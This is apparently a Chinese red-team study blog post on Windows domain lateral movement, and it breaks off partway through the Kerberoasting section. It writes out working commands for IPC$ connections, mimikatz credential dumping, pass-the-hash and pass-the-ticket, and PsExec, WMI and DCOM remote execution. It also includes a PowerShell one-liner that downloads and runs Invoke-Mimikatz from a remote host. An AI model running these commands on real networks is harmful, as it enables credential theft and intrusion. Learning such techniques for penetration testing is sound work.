@@ -1,0 +1,1439 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="内网渗透学习（四）, hack,CTF,Security">
+    <meta name="description" content="Hacking is a new sexy">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>内网渗透学习（四） | Doublenine&#39;s Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Doublenine&#39;s Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Doublenine&#39;s Blog</div>
+        <div class="logo-desc">
+            
+            Hacking is a new sexy
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">内网渗透学习（四）</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                                <span class="chip bg-color">渗透测试</span>
+                            </a>
+                        
+                            <a href="/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">
+                                <span class="chip bg-color">红队攻防</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                渗透测试
+                            </a>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/" class="post-category">
+                                红队攻防
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-02-12
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.1k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    12 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="内网渗透学习（四）"><a href="#内网渗透学习（四）" class="headerlink" title="内网渗透学习（四）"></a>内网渗透学习（四）</h2><p>域内横向移动技术是在复杂的内网攻击中被广泛使用的一种技术，攻击者会利用该技术，以被 攻陷的系统为跳板，访问其他域内主机，扩大资产范围。</p>
+<h3 id="常用Windows远程连接和相关命令"><a href="#常用Windows远程连接和相关命令" class="headerlink" title="常用Windows远程连接和相关命令"></a>常用Windows远程连接和相关命令</h3><h4 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h4><p>IPC共享“命名管道”的资源，是为了实现进程间通信而开放的命名管道。IPC可以通过验证用户名和密码获得相应的权限，通常是远程管理计算机和查看计算机的共享资源时使用。</p>
+<p>建立一个ipc$：</p>
+<pre class=" language-bash"><code class="language-bash">net use \\192.168.100.190\ipc$ <span class="token string">"Aa123456@"</span> /user:administrator</code></pre>
+<h5 id="ipc-利用前提"><a href="#ipc-利用前提" class="headerlink" title="ipc$利用前提"></a>ipc$利用前提</h5><ol>
+<li>开启了139、445端口</li>
+<li>管理员开启了默认共享</li>
+</ol>
+<h5 id="ipc-连接失败原因"><a href="#ipc-连接失败原因" class="headerlink" title="ipc$连接失败原因"></a>ipc$连接失败原因</h5><ol>
+<li>用户名或密码错误</li>
+<li>目标没有打开ipc$默认共享</li>
+<li>不能成功连接目标的139、445端口</li>
+<li>命令输入错误</li>
+</ol>
+<h4 id="使用Windows自带的工具获取远程主机信息"><a href="#使用Windows自带的工具获取远程主机信息" class="headerlink" title="使用Windows自带的工具获取远程主机信息"></a>使用Windows自带的工具获取远程主机信息</h4><ol>
+<li>dir命令（列目录）</li>
+<li>tasklist命令（列进程）</li>
+</ol>
+<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><ol>
+<li>at命令（windows server 2008之前）<ul>
+<li>使用net time命令确定远程机器当前时间</li>
+<li>用copy复制poc到远程机器</li>
+<li>使用at命令定时该poc</li>
+<li>删除使用at命令创建计划任务的记录</li>
+</ul>
+</li>
+<li>schtasks命令（windows server 2008、windows vista及之后）</li>
+</ol>
+<hr>
+<h3 id="Windows系统散列值获取分析"><a href="#Windows系统散列值获取分析" class="headerlink" title="Windows系统散列值获取分析"></a>Windows系统散列值获取分析</h3><h4 id="LM-Hash和NTLM-Hash"><a href="#LM-Hash和NTLM-Hash" class="headerlink" title="LM Hash和NTLM Hash"></a>LM Hash和NTLM Hash</h4><p>Windows操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中，用户信息存储在ntds.dit中，加密后为散列值。</p>
+<p>Windows操作系统中的密码一般由两部分组成，一部分为LM Hash，另一部分为NTLM Hash。在Windows操作系统中，Hash的结构通常如下：</p>
+<pre><code>username:RID:LM-Hash:NTLM-Hash</code></pre><p>LM Hash本质是DES加密，密码不足14位用0补足。若LM Hash被禁用了，攻击者通过工具抓取的LM Hash通常为”aad3b435b51404eeaad3b435b51404ee”(表示LM Hash为空或被禁用)</p>
+<p>NTLM Hash是基于MD4加密算法加密的</p>
+<h4 id="单机密码抓取"><a href="#单机密码抓取" class="headerlink" title="单机密码抓取"></a>单机密码抓取</h4><p>想要在Windows操作系统中抓取散列值或明文密码，必须将权限提升至System。本地用户名、散列值和其他安全验证信息都保存在SAM文件中。</p>
+<p>常用工具和方法：</p>
+<ul>
+<li><p>GetPass工具</p>
+</li>
+<li><p>PwDump7工具</p>
+</li>
+<li><p>QuarksPwDump工具</p>
+</li>
+<li><p>通过SAM和System文件抓取密码</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 1.导出sam文件</span>
+reg save hklm\sam sam.hive
+reg save hklm\system system.hive
+
+<span class="token comment" spellcheck="true"># 2.使用mimikatz或者Cain读取SAM文件</span>
+运行mimikatz后输入命令
+lsadump::sam /sam:sam.hive /system:system.hive
+
+或者在目标机器直接运行mimikatz
+先输入<span class="token string">"privilege::debug"</span>
+再输入<span class="token string">"token::elevate"</span>
+再输入<span class="token string">"lsadump::sam"</span>获取本地SAM文件,获得NTLM Hash</code></pre>
+</li>
+<li><p>使用mimikatz在线获取SAM文件</p>
+<pre class=" language-bash"><code class="language-bash">mimikatz.exe <span class="token string">"privilege::debug"</span> <span class="token string">"log"</span> <span class="token string">"sekurlsa::logonpasswords"</span></code></pre>
+</li>
+<li><p>使用mimikatz离线读取SAM文件</p>
+</li>
+<li><p>使用Powershell对散列值进行Dump操作</p>
+<pre><code>Import-Module .\Get-PassHashes.ps1
+Get-PassHashes</code></pre></li>
+<li><p>使用Powershell远程加载mimikatz抓取散列值和明文密码</p>
+<pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz</code></pre><hr>
+<h3 id="哈希传递攻击分析"><a href="#哈希传递攻击分析" class="headerlink" title="哈希传递攻击分析"></a>哈希传递攻击分析</h3></li>
+</ul>
+<p>通过使用与账户相关的密码散列值来模拟用户登录来进行攻击。通过哈希传递攻击，攻击者不需要破解密码散列值</p>
+<p>攻击利用：</p>
+<ul>
+<li><p>使用NTLM Hash来进行哈希传递</p>
+<p>在目标机器以管理员权限运行mimikatz，输入命令：</p>
+<pre><code>mimikatz&gt; privilege::debug
+mimikatz&gt; sekurlsa::pth /user:administrator /domain:pentest.com /ntlm:D9F9553F...</code></pre></li>
+<li><p>使用AES-256密钥进行哈希传递</p>
+<p>使用mimikatz抓取AES-256密钥</p>
+<pre><code>mimikatz&gt; privilege::debug
+mimikatz&gt; sekurlsa::ekeys
+# 抓取到密钥后
+mimikatz&gt; privilege::debug
+mimikatz&gt; sekurlsa:pth /user:administrator /domain:pentest.com /aes256:2781f14...</code></pre><pre><code>命令行输入
+dir \\dc\c$
+# dir后跟要使用的主机名，而不是IP地址</code></pre><blockquote>
+<p>需在目标机器安装KB2871997</p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<h3 id="票据攻击传递分析"><a href="#票据攻击传递分析" class="headerlink" title="票据攻击传递分析"></a>票据攻击传递分析</h3><p>  哈希传递需要本地管理员权限，而票据传递则不需要</p>
+<h4 id="使用mimikatz进行票据传递"><a href="#使用mimikatz进行票据传递" class="headerlink" title="使用mimikatz进行票据传递"></a>使用mimikatz进行票据传递</h4><p>  使用mimikatz可以将内存中的票据导出。</p>
+<pre><code>  mimikatz&gt; privilege::debug
+  mimikatz&gt; sekurlsa::tickets /export</code></pre><p>  会在当前目录下出现多个服务的票据文件</p>
+<p>  清除内存中的票据</p>
+<pre><code>  mimikatz&gt; kerberos::purge</code></pre><p>  将票据文件注入内存</p>
+<pre><code>  mimikatz &quot;kerberos::ptt &quot;C:\ticket\[0;4f7cf]-2-0-60a00000-administrator@krbtgt-PENTEST.COM.kirbi&quot;</code></pre><p>  将高权限的票据信息注入内存后，将列出远程计算机系统的文件目录</p>
+<pre><code>  dir \\dc\c$</code></pre><h4 id="使用kekeo进行票据传递"><a href="#使用kekeo进行票据传递" class="headerlink" title="使用kekeo进行票据传递"></a>使用kekeo进行票据传递</h4><hr>
+<h3 id="PsExec使用"><a href="#PsExec使用" class="headerlink" title="PsExec使用"></a>PsExec使用</h3><p>  PsExec主要用于大批量Windows主机的运维，在域环境下效果尤好。攻击者使用PsExec通过命令行环境与目标机器进行连接，甚至控制目标机器。</p>
+<ol>
+<li><p>在建立了ipc$的情况下，获取system权限的shell</p>
+<pre><code>PsExec.exe -accepteula \\192.168.100.190 -s cmd.exe</code></pre><blockquote>
+<p>-accepteula 参数不会弹出确认框</p>
+</blockquote>
+</li>
+<li><p>没建立ipc$时，使用账号密码登录</p>
+<pre><code>psexec \\192.168.100.190 -u administrator -p Aa123456@ cmd.exe</code></pre><p>使用PsExec的前提条件：</p>
+</li>
+</ol>
+<ul>
+<li>需要远程系统开启admin$共享（默认开启）</li>
+<li>在使用ipc$连接目标后，不需要输入账号密码</li>
+</ul>
+<ul>
+<li>Metesploit中也有PsExec模块</li>
+</ul>
+<hr>
+<h3 id="WMI使用"><a href="#WMI使用" class="headerlink" title="WMI使用"></a>WMI使用</h3><p>Windows Management Instrumentation。从Win98开始，Windows操作系统支持WMI，可以在本地或者远程管理计算机系统。</p>
+<p>攻击者在使用wmi进行横向移动时，Windows操作系统默认不会将WMI的操作记录在日志中。</p>
+<h4 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h4><pre><code>wmic /node:192.168.100.190 /user:administrator /password:Aa123456 process call create &quot;cmd.exe&quot; /c ipconfig &gt;ip.txt</code></pre><p>建立ipc$后，使用type命令读取执行结果</p>
+<pre><code>type \\192.168.100.190\C$\ip.txt</code></pre><ul>
+<li><p>impacket工具包中的wmiexec</p>
+</li>
+<li><p>wmiexec.vbs</p>
+<p>通过VBS调用WMI来模拟PsExec的功能</p>
+</li>
+<li><p>Invoke-WmiCommand.ps1脚本</p>
+</li>
+<li><p>Invoke-WMIMethod</p>
+</li>
+</ul>
+<hr>
+<h3 id="DCOM在远程系统中的使用"><a href="#DCOM在远程系统中的使用" class="headerlink" title="DCOM在远程系统中的使用"></a>DCOM在远程系统中的使用</h3><p>DCOM（分布式组件对象模型）是微软的一系列概念和程序接口。通过DCOM，客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发送请求。</p>
+<p>DCOM是基于对象组件模型（COM）的。COM提供了一套允许在同一台计算机上的客户端和服务器之间进行通信的接口。</p>
+<h4 id="通过本地DCOM执行命令"><a href="#通过本地DCOM执行命令" class="headerlink" title="通过本地DCOM执行命令"></a>通过本地DCOM执行命令</h4><p>获取DCOM程序列表</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Powershell3.0以上</span>
+Get-CimInstance Win32_DCOMApplication
+
+<span class="token comment" spellcheck="true"># Powershell2.0以上</span>
+Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication</code></pre>
+<p>使用DCOM执行任意命令</p>
+<p>本地启动一个管理员权限的Powershell，执行如下命令</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token variable">$com</span> <span class="token operator">=</span> <span class="token punctuation">[</span>activator<span class="token punctuation">]</span>::CreateInstance<span class="token punctuation">(</span><span class="token punctuation">[</span>type<span class="token punctuation">]</span>::GetTypeFromProgID<span class="token punctuation">(</span><span class="token string">"MMC20.Application"</span>,<span class="token string">"127.0.0.1"</span><span class="token punctuation">))</span></code></pre>
+<pre class=" language-bash"><code class="language-bash"><span class="token variable">$com</span>.Document.ActiveView.ExecuteShellCommand<span class="token punctuation">(</span><span class="token string">'cmd.exe'</span>,<span class="token variable">$null</span>,<span class="token string">"/c calc.exe"</span>,<span class="token string">"Minimzed"</span><span class="token punctuation">)</span></code></pre>
+<h4 id="使用DCOM在远程机器上执行命令"><a href="#使用DCOM在远程机器上执行命令" class="headerlink" title="使用DCOM在远程机器上执行命令"></a>使用DCOM在远程机器上执行命令</h4><p>前提：</p>
+<ul>
+<li>关闭系统防火墙</li>
+<li>具有本地管理员权限账号</li>
+</ul>
+<ol>
+<li><p>通过ipc$连接远程计算机</p>
+<pre class=" language-bash"><code class="language-bash">net use \\192.168.100.205 <span class="token string">"a123456@"</span> /user:pentest.com\dm</code></pre>
+</li>
+<li><p>执行命令</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 调用MMC20.Application远程执行命令</span>
+<span class="token variable">$com</span> <span class="token operator">=</span> <span class="token punctuation">[</span>activator<span class="token punctuation">]</span>::CreateInstance<span class="token punctuation">(</span><span class="token punctuation">[</span>type<span class="token punctuation">]</span>::GetTypeFromProgID<span class="token punctuation">(</span><span class="token string">"MMC20.Application"</span>,<span class="token string">"192.168.100.205"</span><span class="token punctuation">))</span>
+<span class="token variable">$com</span>.Document.ActiveView.ExecuteShellCommand<span class="token punctuation">(</span><span class="token string">'cmd.exe'</span>,<span class="token variable">$null</span>,<span class="token string">"/c calc.exe"</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># 调用9BA05972-F6A8-11CF-A442-00A0C90A8F39</span>
+<span class="token variable">$com</span> <span class="token operator">=</span> <span class="token punctuation">[</span>Type<span class="token punctuation">]</span>::GetTypeFromProgID<span class="token punctuation">(</span><span class="token string">'9BA05972-F6A8-11CF-A442-00A0C90A8F39'</span>,<span class="token string">"192.168.100.205"</span><span class="token punctuation">)</span>
+<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token punctuation">[</span>System.Activator<span class="token punctuation">]</span>::CreateInstance<span class="token punctuation">(</span><span class="token variable">$com</span><span class="token punctuation">)</span>
+<span class="token variable">$item</span> <span class="token operator">=</span> <span class="token variable">$obj</span>.item<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token variable">$item</span>.Document.Application.ShellExecute<span class="token punctuation">(</span><span class="token string">"cmd.exe"</span>,<span class="token string">"/c calc.exe"</span>,<span class="token string">"c:\windows\system32"</span>,<span class="token variable">$null</span>,0<span class="token punctuation">)</span></code></pre>
+</li>
+</ol>
+<hr>
+<h3 id="SPN在域环境中的应用"><a href="#SPN在域环境中的应用" class="headerlink" title="SPN在域环境中的应用"></a>SPN在域环境中的应用</h3><p>在域环境中运行的大量应用包含了多种资源，为资源的合理分组、分类和再分配提供了便利。微软给域内的每种资源分配了不同的服务主体名称SPN（Service Principal Name）</p>
+<p>在使用Kerberos协议进行身份验证的网络中，必须在内置账号或者用户账号下为服务器注册SPN。对于内置账号，SPN将自动进行注册。但是，如果在域用户账号下运行服务，则必须为要使用的账号手动注册SPN。</p>
+<p>因为域环境中的每台服务器都需要在Kerberos身份验证服务中注册SPN，所以攻击者会直接向域控制器发送查询请求，获取其需要的服务的SPN，从而知晓其需要使用的服务资源在哪台机器上。</p>
+<h4 id="SPN命令格式"><a href="#SPN命令格式" class="headerlink" title="SPN命令格式"></a>SPN命令格式</h4><pre><code>SPN = serviceclass &quot;/&quot; hostname [&quot;:&quot;port] [&quot;/&quot; servicename]</code></pre><ul>
+<li>serviceclass：服务组件的名称</li>
+<li>hostname：以”/“与后面的名称分隔，是计算机的FQDN（全限定域名，同时带有计算机名和域名）</li>
+<li>port：以冒号分隔，后面的内容为该服务监听的端口号</li>
+<li>servicename：一个字符串，可以是服务的专有名称（DN）、objectGuid、Internet主机名或全限定域名</li>
+</ul>
+<h4 id="常见的SPN服务"><a href="#常见的SPN服务" class="headerlink" title="常见的SPN服务"></a>常见的SPN服务</h4><ul>
+<li><p>MSSQL服务</p>
+<pre><code>MSSQLSvc/computer1.pentest.com:1433</code></pre><blockquote>
+<p>serviceclass和hostname是必选参数，port和servicename是可选参数</p>
+</blockquote>
+</li>
+<li><p>Exchange</p>
+<pre><code>exchangeMDB/EXCAS01.pentest.com</code></pre></li>
+<li><p>RDP服务</p>
+<pre><code>TERMSERV/EXCAS01.pentest.com</code></pre></li>
+<li><p>WSMan/WinRM/PSRemoting服务</p>
+<pre><code>WSMAN/EXCAS01.pentest.com</code></pre></li>
+</ul>
+<h4 id="用于SPN扫描的Powershell脚本"><a href="#用于SPN扫描的Powershell脚本" class="headerlink" title="用于SPN扫描的Powershell脚本"></a>用于SPN扫描的Powershell脚本</h4><p>通过请求特定的SPN类型的服务主体名称来查找服务，与网络端口扫描相比，SPN扫描的主要特点是不需要通过连接网络中的每个IP地址来检查服务端口。</p>
+<p>因为SPN是通过LDAP协议向域控制器进行查询的，所以攻击者只要获得一个普通的域用户权限，就可以进行SPN扫描。</p>
+<p>扫描MSSQL服务：</p>
+<pre><code>Import-Module .\Discover-PSMSSQLServers.ps1
+Discover-PSMSSQLServers</code></pre><p>扫描所有SPN服务：</p>
+<pre><code>Import-Module .\Discover-PSInterestingServices
+Discover-PSInterestingServices</code></pre><p>windows自带工具：</p>
+<pre><code>setspn -T domain -q */*</code></pre><h4 id="Kerberoast攻击"><a href="#Kerberoast攻击" class="headerlink" title="Kerberoast攻击"></a>Kerberoast攻击</h4><p>在因为需要使用某个特定资源而向TGS发送Kerberos服务票据的请求时，用户首先需要使用具有有效身份权限的TGT向TGS请求相应服务的票据。当TGT被验证有效且具有该服务的权限时，会向用户发送一张票据。该票据使用与SPN相关联的计算机服务账号的NTLM Hash（RC4_HMAC_MD5）。也就是说，攻击者会通过Kerberos尝试使用不同的NTLM Hash来打开Kerberos票据。如果攻击者使用的NTLM Hash是正确的，Kerberos票据就会被打开，而该NTLM Hash对应于该计算机服务账号的密码。</p>
+<ol>
+<li><p>手动注册SPN</p>
+<pre class=" language-bash"><code class="language-bash">setspn -A MSSQLSvc/computer1.pentest.com:1433 mssql</code></pre>
+</li>
+<li><p>查看用户所对应的SPN</p>
+<pre><code>setspn -L pentest.com/mssql</code></pre></li>
+<li><p>使用adsiedit.msc查看用户SPN及其他高级属性</p>
+</li>
+<li><p>配置指定服务的登录权限</p>
+<pre class=" language-bash"><code class="language-bash">gpedit.msc\Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights Assignment\Log on as a <span class="token function">service</span></code></pre>
+</li>
+<li><p>修改加密类型</p>
+<pre><code>gpedit.msc\Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Network security: Configure encryption types allowed for Kerberos</code></pre></li>
+<li><p>请求SPN Kerberos票据</p>
+<pre><code>Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestor SecurityToken
+-ArgumentList &quot;MSSQLSvc/computer1.pentest.com&quot;</code></pre></li>
+<li><p>导出票据</p>
+<pre><code>mimikatz&gt; kerberos::list /export</code></pre></li>
+<li><p>使用Kerberos脚本离线破解票据所对应账号的NTLM Hash</p>
+<p>下载kerberos，将票据文件复制到目录下</p>
